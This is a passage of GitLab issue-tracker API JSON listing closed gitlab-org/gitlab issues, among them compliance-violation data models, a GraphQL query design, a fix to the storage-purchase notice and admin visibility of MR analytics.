a single image repository (not on the repository list view).","state":"closed","created_at":"2021-12-07T18:05:54.592Z","updated_at":"2022-03-18T07:02:42.929Z","closed_at":"2022-03-10T12:24:08.928Z","closed_by":{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"labels":["Category:Container Registry","Deliverable","OpsSection::needs-justification","Package:P1","auto updated","devops::package","frontend","group::package registry","section::ops","type::feature","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"}],"author":{"id":5054840,"username":"jdrpereira","name":"Joo Pereira","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054840/avatar.png","web_url":"https://gitlab.com/jdrpereira"},"type":"ISSUE","assignee":{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"user_notes_count":26,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347350","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347350","notes":"https://gitlab.com/api/v4/projects/278964/issues/347350/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347350/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347350","relative":"#347350","full":"gitlab-org/gitlab#347350"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7575,"epic":{"id":446718,"iid":7575,"title":"Repository-level storage usage visibility for the Container Registry","url":"/groups/gitlab-org/-/epics/7575","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98619985,"iid":347339,"project_id":278964,"title":"Project level MR analytics not visible to admins","description":"## Problem\n\nProject level MR analytics is not visible to admin users, but they should be.  The first example was [CI/CD Analytics](https://gitlab.com/gitlab-org/gitlab/-/issues/343661).  While executing that issue, @ahegyi noticed [it is a problem with other issues](https://gitlab.com/gitlab-org/gitlab/-/issues/343661#note_754604981) like MR Analytics.\n\nWe have since confirmed that the only remaining permission problem is project level MR Analytics.\n\n## Proposal\n\nRemove admin visibility restriction from project level MR Analytics","state":"closed","created_at":"2021-12-07T17:32:54.392Z","updated_at":"2022-05-12T12:12:13.756Z","closed_at":"2022-05-12T12:12:13.737Z","closed_by":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"labels":["backend","devops::manage","group::optimize","permissions","priority::3","section::dev","severity::3","type::bug","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"}],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347339","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347339","notes":"https://gitlab.com/api/v4/projects/278964/issues/347339/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347339/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347339","relative":"#347339","full":"gitlab-org/gitlab#347339"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98615647,"iid":347333,"project_id":278964,"title":"UX: Scalable Metrics Dictionary","description":"## Summary\n\nIn https://gitlab.com/groups/gitlab-org/-/epics/6522 we created [a tool](https://metrics.gitlab.com/) (viewable internally and externally) for the community to gain information related to the [Service Usage Data](https://about.gitlab.com/handbook/legal/privacy/services-usage-data/) we collect. \n\nWe did not have any UX design input on this tool and I'd like to make the tool look more like a GitLab property from a styling perspective.\n\n### Who will use this solution? \n\n\u003c!-- If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n\n--\u003e\n\n\n### What problem do they have?\n\n\n### When do they have the problem?\n\n\n### Where in the app do they have the problem and at what frequency (if known)?\n\n\n### Why will a design help them?\n\n\n### What is the JTBD and/or Tasks?\n\n\n### Is this problem supported by user research (please link relevant research issue/s)?\n\n\n### Known technical constraints\n\n\n### How does this help the business?","state":"closed","created_at":"2021-12-07T16:13:22.009Z","updated_at":"2022-01-12T21:54:16.072Z","closed_at":"2022-01-12T21:54:16.057Z","closed_by":{"id":2890431,"username":"amandarueda","name":"Amanda Rueda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2890431/avatar.png","web_url":"https://gitlab.com/amandarueda"},"labels":["UX","[deprecated] Category:Utilization","auto updated","devops::fulfillment","group::utilization","section::fulfillment"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":5058729,"username":"mnearents","name":"Matthew Nearents","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5058729/avatar.png","web_url":"https://gitlab.com/mnearents"}],"author":{"id":2890431,"username":"amandarueda","name":"Amanda Rueda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2890431/avatar.png","web_url":"https://gitlab.com/amandarueda"},"type":"ISSUE","assignee":{"id":5058729,"username":"mnearents","name":"Matthew Nearents","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5058729/avatar.png","web_url":"https://gitlab.com/mnearents"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347333","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347333","notes":"https://gitlab.com/api/v4/projects/278964/issues/347333/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347333/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347333","relative":"#347333","full":"gitlab-org/gitlab#347333"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6522,"epic":{"id":321040,"iid":6522,"title":"Scalable Metrics Dictionary","url":"/groups/gitlab-org/-/epics/6522","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98614629,"iid":347331,"project_id":278964,"title":"Improve UX for Storage purchase via GitLab","description":"## Problem\n\nIt takes a few seconds after Storage purchase to render the update amount of Storage correctly on the Usage Quotas tab. Thus most of the time a user sees a green notification that the storage is purchased but the number still shows 0.0 storage. Refresh of the page in a second will fix it.\n\n| Right after the purchase | Refresh after 1 second |\n| ------ | ------ |\n| ![Screenshot_2021-12-06_at_10.17.19](/uploads/c965e800e6108d9e097110f2b0b5edf6/Screenshot_2021-12-06_at_10.17.19.png) | ![Screenshot_2021-12-06_at_10.17.44](/uploads/d7b8e32cad30edf4634d853e21885711/Screenshot_2021-12-06_at_10.17.44.png) |\n\n## Proposal\n\nPossible solutions:\n\n1. Update notification text with:\n\n\u003e **Thanks for your purchase!**\n\u003e \n\u003e You have successfully purchased a storage subscription. Youll receive a receipt by email. Your purchase may take a minute to sync, so refresh the page if you don't see it yet.\n\n2. Wait a bit longer with redirecting back (potentially a \\~1000 ms delay for a redirect)\n\n## Follow-up\n\nA more robust solution could be to use state for the UsageQuotas page, and update this state when we successfully send amend request to subscription (update the state on redirect). This option needs to be investigated further. Issue: https://gitlab.com/gitlab-org/gitlab/-/issues/348193","state":"closed","created_at":"2021-12-07T15:54:38.604Z","updated_at":"2022-09-28T10:00:30.773Z","closed_at":"2022-01-12T02:33:32.015Z","closed_by":{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"},"labels":["Category:Purchase","Deliverable","Technical Writing","UI text","devops::fulfillment","frontend","group::purchase","missed-deliverable","missed:14.6","onboarding","section::fulfillment","severity::3","type::feature","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"}],"author":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"type":"ISSUE","assignee":{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"},"user_notes_count":33,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347331","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347331","notes":"https://gitlab.com/api/v4/projects/278964/issues/347331/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347331/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347331","relative":"#347331","full":"gitlab-org/gitlab#347331"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5789,"epic":{"id":251641,"iid":5789,"title":"Move Storage purchase flows to GitLab.com (Group namespaces only)","url":"/groups/gitlab-org/-/epics/5789","group_id":9970,"human_readable_end_date":"Feb 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98611371,"iid":347325,"project_id":278964,"title":"Add GraphQL type to allow retrieval of compliance violations within a group","description":"## Why are we doing this work\n\nTo implement the [next iteration of the \"Compliance Dashboard\"](https://gitlab.com/gitlab-org/gitlab/-/issues/299359) we should store compliance violations such as a failure of [separations of duties](https://docs.gitlab.com/ee/user/compliance/compliance_dashboard/#approval-status-and-separation-of-duties).\n\nThanks to the work done in #347324 we should now have a collection of compliance violations saved into the new table. This issue should be used to surface these to the GraphQL API.\n\n## Proposed Data Structure\n\n```graphql\nquery getComplianceViolations($fullPath: ID!, $filters: ViolationFilters, $sort: String) {\n  group(fullPath: $fullPath) {\n    id\n    mergeRequestViolations(filters: $filters, sort: $sort) {\n      nodes {\n        id\n        severity\n        reason\n        violatingUser {\n          id\n          name\n          username\n          state\n          avatarUrl\n          webUrl\n        }\n        mergeRequest {\n          id\n          title\n          mergedAt\n          milestone\n          webUrl\n          author {\n            id\n            name\n            username\n            state\n            avatarUrl\n            webUrl\n          }\n          mergedBy {\n            id\n            name\n            username\n            state\n            avatarUrl\n            webUrl\n          }\n          committers {\n            nodes {\n              id\n              name\n              username\n              state\n              avatarUrl\n              webUrl\n            }\n          }\n          participants {\n            nodes {\n              id\n              name\n              username\n              state\n              avatarUrl\n              webUrl\n            }\n          }\n          approvedBy {\n            nodes {\n              id\n              name\n              username\n              state\n              avatarUrl\n              webUrl\n            }\n          }\n          ref: reference\n          fullRef: reference(full: true)\n          sourceBranch\n          sourceBranchExists\n          targetBranch\n          targetBranchExists\n          headPipeline {\n            detailedStatus {\n              id\n              icon\n              favicon\n              text\n              label\n              group\n              tooltip\n              hasDetails\n              detailsPath\n            }\n          }\n        }\n        project {\n          id\n          avatarUrl\n          name\n          webUrl\n          complianceFrameworks {\n            nodes {\n              id\n              name\n              description\n              color\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nThe `ViolationFilters` should be a new type like [`EpicFilters`](https://docs.gitlab.com/ee/api/graphql/reference/#epicfilters) and it should accept the following arguments:\n\n```\n$projectIds: [ID!], $createdBefore: Time, $createdAfter: Time\n```\n\nSort should use this [format](https://docs.gitlab.com/ee/api/graphql/reference/#sort) and have ASC and DESC values for `Severity`, `Violation` (type / user?), `Merge request` (alphabetical on name), and `Date merged`.","state":"closed","created_at":"2021-12-07T14:55:44.519Z","updated_at":"2022-03-14T10:43:35.949Z","closed_at":"2022-03-07T12:14:40.228Z","closed_by":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"labels":["Enterprise Edition","GitLab Ultimate","GraphQL","backend","devops::manage","group::compliance","priority::1","section::dev","type::feature","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"user_notes_count":18,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347325","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347325","notes":"https://gitlab.com/api/v4/projects/278964/issues/347325/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347325/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347325","relative":"#347325","full":"gitlab-org/gitlab#347325"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7222,"epic":{"id":401057,"iid":7222,"title":"Introduce concept of Merge Request Violation","url":"/groups/gitlab-org/-/epics/7222","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"at_risk"},{"id":98611346,"iid":347324,"project_id":278964,"title":"On MR merge, save a list of compliance violations that occurred at the point of merging","description":"## Why are we doing this work\n\nTo implement the [next iteration of the \"Compliance Dashboard\"](https://gitlab.com/gitlab-org/gitlab/-/issues/299359) we should store compliance violations such as a failure of [separations of duties](https://docs.gitlab.com/ee/user/compliance/compliance_dashboard/#approval-status-and-separation-of-duties).\n\nThis issue is to take the work from #347323 and implement the process to trigger the creation of compliance violations at the point the MR is merged. \n\nWe should implement the following:\n\n* Add trigger to MR merging process\n* Add async worker to check for compliance violations and save them to the new table","state":"closed","created_at":"2021-12-07T14:55:19.038Z","updated_at":"2022-02-01T09:17:56.158Z","closed_at":"2022-02-01T09:17:56.135Z","closed_by":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"labels":["Enterprise Edition","GitLab Ultimate","backend","devops::manage","group::compliance","priority::2","section::dev","type::feature","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347324","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347324","notes":"https://gitlab.com/api/v4/projects/278964/issues/347324/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347324/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347324","relative":"#347324","full":"gitlab-org/gitlab#347324"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7222,"epic":{"id":401057,"iid":7222,"title":"Introduce concept of Merge Request Violation","url":"/groups/gitlab-org/-/epics/7222","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98611292,"iid":347323,"project_id":278964,"title":"Introduce new compliance violations domain model","description":"## Why are we doing this work\n\nTo implement the [next iteration of the \"Compliance Dashboard\"](https://gitlab.com/gitlab-org/gitlab/-/issues/299359) we should store compliance violations such as a failure of [separations of duties](https://docs.gitlab.com/ee/user/compliance/compliance_dashboard/#approval-status-and-separation-of-duties).\n\nCurrently, this information is generated on the fly but this proposal is to create a new domain model: `MergeRequests::ComplianceViolation` which encapsulates information about a single failure of an MR to adhere to a particular hard-coded rule.\n\nExamples of these include:\n\n* When an author approves their own MR.\n* When a committer approves their own MR.\n* When an MR is merged with an `X%` drop of code coverage.\n\nWe should implement the following:\n\n* The new domain model\n* The base violations\n* The modal structure to save the data\n\n## Proposed Data Structure\n\n* `MergeRequest` has zero or more `MergeRequests::ComplianceViolation`\n* Before merging, a `MergeRequest` **should have NO violations.**\n\n| Column Name | Type | Example | Notes | \n| ------ | ------ | ------ | ------ |\n| `merge_request_id` | bigint (foreign key on `merge_requests.id`) | `1` | Which MR? |\n| `violating_user_id` | bigint | (foreign key on `users.id`) | `1` | Which user _caused_ the violation? (Not who merged it, we can figure that out from the association to MR.) |\n| `reason` | enum | `approved_by_author: 0`, `approved_by_committer: 1`, `approved_by_insufficient_users: 2` | What caused the violation? We can map each of these to a hard-coded severity as defined by us. |","state":"closed","created_at":"2021-12-07T14:54:54.874Z","updated_at":"2021-12-17T10:39:51.100Z","closed_at":"2021-12-17T10:39:51.077Z","closed_by":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"labels":["Enterprise Edition","GitLab Ultimate","backend","devops::manage","group::compliance","priority::2","section::dev","type::feature","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347323","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347323","notes":"https://gitlab.com/api/v4/projects/278964/issues/347323/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347323/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347323","relative":"#347323","full":"gitlab-org/gitlab#347323"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7222,"epic":{"id":401057,"iid":7222,"title":"Introduce concept of Merge Request Violation","url":"/groups/gitlab-org/-/epics/7222","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"at_risk"},{"id":98609845,"iid":347317,"project_id":278964,"title":"Follow-up from \"E2E: Generate knapsack report on scheduled runs\"","description":"The following discussions from !75479 should be addressed:\n\n- [ ] @rymai started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75479#note_755094354): \n\n    \u003e **question:** WDYT of setting this variable in the `.review:rules:start-review-app-pipeline` rules definition: https://gitlab.com/gitlab-org/gitlab/-/blob/b5848df65207812b036487d4f2339f75d961f760/.gitlab/ci/rules.gitlab-ci.yml#L1570-1584. This can be done as a follow-up when we'll re-enable Review Apps on 2-hour schedules.\n\n- [ ] @rymai started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75479#note_755094356): \n\n    \u003e Same here.","state":"closed","created_at":"2021-12-07T14:32:58.415Z","updated_at":"2022-03-16T11:29:03.607Z","closed_at":"2021-12-14T13:54:56.264Z","closed_by":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"labels":["Engineering Productivity","maintenance::pipelines","type::maintenance","workflow::in review"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347317","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347317","notes":"https://gitlab.com/api/v4/projects/278964/issues/347317/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347317/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347317","relative":"#347317","full":"gitlab-org/gitlab#347317"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98604103,"iid":347309,"project_id":278964,"title":"Filter `license_scanning_jobs` out of Service Ping payload","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords 